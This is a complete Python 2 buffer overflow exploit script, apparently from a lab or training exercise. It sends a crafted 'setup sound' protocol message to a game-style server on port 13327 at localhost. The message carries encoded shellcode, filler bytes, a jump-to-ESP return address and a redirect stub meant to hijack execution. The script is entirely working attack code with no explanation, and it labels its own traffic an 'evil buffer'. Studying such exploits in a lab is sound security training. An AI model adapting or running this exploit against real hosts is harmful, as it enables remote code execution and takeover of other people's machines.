#!/usr/bin/python
import socket

host="127.0.0.1"
#jmp into esp
jump="\x97\x45\x13\x08"

shellcode=("\xdd\xc1\xba\x17\x0d\x3a\x71\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x14\x83\xed\xfc\x31\x55\x15\x03\x55\x15\xf5\xf8\x0b\xaa\x0e"
"\xe1\x3f\x0f\xa3\x8c\xbd\x06\xa2\xe1\xa4\xd5\xa4\x59\x77\xb4"
"\xcc\x5f\x87\x29\x50\x0a\x97\x18\x38\x43\x76\xf0\xde\x0b\xb4"
"\x85\x97\xed\x42\x35\xa3\x5d\x2c\xf4\x2b\xde\x01\x60\xe6\x61"
"\xf2\x34\x92\x5e\xad\x0b\xe2\xe8\x34\x6c\x8a\xc5\xe9\xff\x22"
"\x72\xd9\x9d\xdb\xec\xac\x81\x4b\xa2\x27\xa4\xdb\x4f\xf5\xa7")

crash=shellcode+"\x41"*(4368-105) + jump  + "\x83\xC0\x0C\xFF\xE0\x90\x90"
buffer="\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "Payload sent!"
